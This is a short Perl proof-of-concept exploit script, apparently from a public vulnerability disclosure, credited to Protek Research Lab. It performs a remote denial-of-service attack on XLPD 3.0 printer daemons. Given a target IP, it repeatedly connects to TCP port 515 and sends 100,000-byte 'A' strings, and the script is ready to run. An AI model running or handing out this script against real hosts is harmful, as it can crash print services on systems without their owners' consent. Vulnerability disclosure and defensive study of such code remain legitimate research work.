#!/usr/bin/perl

###################################################################################
#
# Software:     XLPD 3.0 Remote DoS
# Found By:     Francis Provencher (Protek Research Lab's)
# Tested On:    Windows XPSP2
# Usage:        perl scriptname <Target IP>
#
###################################################################################

use Getopt::Std;
use Socket;
my $SOCKET = "";

$loop = 51;
$host = $ARGV[0];
$port = 515;


if (!defined $host){
                 print "Host not defined.\n"
}

$str = "\x41" x 100000;

$iaddr = inet_aton($host)           || die "Unknown host: $host\n";
$paddr = sockaddr_in($port, $iaddr) || die "getprotobyname: $!\n";
$proto = getprotobyname('tcp')      || die "getprotobyname: $!\n";

for ($j=1;$j<$loop;$j++) {

         socket(SOCKET,PF_INET,SOCK_STREAM, $proto) || die "socket: $!\n";
         connect(SOCKET,$paddr) || die "Lost Conection: $! .........bye bye?\n";
         send(SOCKET,$str, 0)    || die "failure sent: $!\n";
         print "\nSending string: ".$j;
         sleep(1);
         close SOCKET;
         sleep(1);
}
